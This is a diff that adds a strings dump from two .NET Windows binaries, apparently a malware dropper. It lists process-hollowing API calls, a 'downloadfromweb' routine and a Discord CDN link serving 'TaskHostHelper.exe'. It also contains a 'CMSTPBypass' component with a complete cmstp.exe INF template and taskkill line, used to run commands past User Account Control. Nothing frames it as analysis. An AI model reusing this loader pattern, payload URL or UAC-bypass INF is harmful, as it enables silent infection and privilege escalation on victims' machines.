@@ -1,0 +1,330 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+v4.0.30319
+#Strings
+Reserved1
+kernel32
+ToUInt32
+ToInt32
+Reserved2
+x65454
+ToInt16
+<Module>
+DelegateCreateProcessA
+LoadLibraryA
+SW_HIDE
+System.IO
+SW_SHOW
+DownloadData
+downloadfromweb
+mscorlib
+set_Verb
+ThreadId
+ProcessId
+GetProcessById
+bytesRead
+DelegateResumeThread
+thread
+payload
+method
+FileMode
+EndInvoke
+BeginInvoke
+IDisposable
+ThreadHandle
+RuntimeTypeHandle
+GetTypeFromHandle
+ProcessHandle
+handle
+get_MainModule
+ProcessModule
+get_FileName
+applicationName
+commandLine
+ValueType
+Dispose
+MulticastDelegate
+GuidAttribute
+DebuggableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+set_UseShellExecute
+x65454.exe
+get_Size
+bufferSize
+SizeOf
+System.Threading
+System.Runtime.Versioning
+String
+GetTempPath
+dropPath
+length
+LoadApi
+CreateApi
+AsyncCallback
+callback
+Marshal
+kernel32.dll
+user32.dll
+FileStream
+Program
+System
+bytesWritten
+installation
+StartupInformation
+ProcessInformation
+processInformation
+DelegateZwUnmapViewOfSection
+System.Reflection
+Exception
+StringComparison
+startupInfo
+ProcessStartInfo
+Desktop
+payloadBuffer
+buffer
+GetDelegateForFunctionPointer
+BitConverter
+StdError
+.cctor
+IntPtr
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+DebuggingModes
+inheritHandles
+threadAttributes
+processAttributes
+GetBytes
+creationFlags
+Equals
+hProcess
+GetCurrentProcess
+process
+GetProcAddress
+baseAddress
+address
+Exists
+Concat
+Object
+object
+protect
+System.Net
+IAsyncResult
+result
+WebClient
+environment
+Convert
+StdInput
+StdOutput
+DelegateWow64GetThreadContext
+DelegateGetThreadContext
+DelegateWow64SetThreadContext
+DelegateSetThreadContext
+context
+GetConsoleWindow
+ShowWindow
+nCmdShow
+DelegateVirtualAllocEx
+BlockCopy
+DelegateReadProcessMemory
+DelegateWriteProcessMemory
+currentDirectory
+WrapNonExceptionThrows
+x65454
+Copyright 
+  2021
+$83189a3f-4ca8-41d8-980d-fcb89e8e0514
+1.0.0.0
+.NETFramework,Version=v4.7.2
+FrameworkDisplayName
+.NET Framework 4.7.2
+E:\@56\x65454\x65454\x65454\obj\Debug\x65454.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+v4.0.30319
+#Strings
+<Module>
+-89516.exe
+CMSTPBypass
+mscorlib
+System
+Object
+InfData
+ShowWindow
+SetForegroundWindow
+BinaryPath
+SetInfFile
+SetWindowActive
+GetResource
+nCmdShow
+CommandToExecute
+ProcessName
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+-89516
+System.Runtime.InteropServices
+DllImportAttribute
+user32.dll
+System.IO
+GetRandomFileName
+Convert
+ToChar
+String
+Environment
+SpecialFolder
+GetFolderPath
+Concat
+System.Text
+StringBuilder
+Append
+Replace
+ToString
+WriteAllText
+WriteAllBytes
+System.Diagnostics
+ProcessStartInfo
+set_Arguments
+set_UseShellExecute
+set_CreateNoWindow
+ProcessWindowStyle
+set_WindowStyle
+Process
+IntPtr
+op_Equality
+System.Windows.Forms
+SendKeys
+SendWait
+GetProcessesByName
+Refresh
+get_MainWindowHandle
+System.Reflection
+Assembly
+GetExecutingAssembly
+System.Resources
+ResourceManager
+GetObject
+.cctor
+4v4twzngnqj.resources
+WrapNonExceptionThrows
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+5gd3wlnltfb
+\TaskHostHelper.exe
+https://cdn.discordapp.com/attachments/599226424695455755/800470210456846366/TaskHostHelper.exe
+kernel32
+ResumeThread
+Wow64SetThreadContext
+SetThreadContext
+Wow64GetThreadContext
+GetThreadContext
+VirtualAllocEx
+WriteProcessMemory
+ReadProcessMemory
+ZwUnmapViewOfSection
+CreateProcessA
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+x65454
+FileVersion
+1.0.0.0
+InternalName
+x65454.exe
+LegalCopyright
+Copyright 
+  2021
+LegalTrademarks
+OriginalFilename
+x65454.exe
+ProductName
+x65454
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
+REPLACE_COMMAND_LINE
+\temp\
+5gd3wlnltfb
+cmd /c start "
+{ENTER}
+4v4twzngnqj
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+REPLACE_COMMAND_LINE
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[Strings]
+ServiceName="Crimson"
+ShortSvcName="Crimson"
+c:\windows\system32\cmstp.exe
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+FileDescription
+FileVersion
+0.0.0.0
+InternalName
+-89516.exe
+LegalCopyright
+OriginalFilename
+-89516.exe
+ProductVersion
+0.0.0.0
+Assembly Version
+0.0.0.0
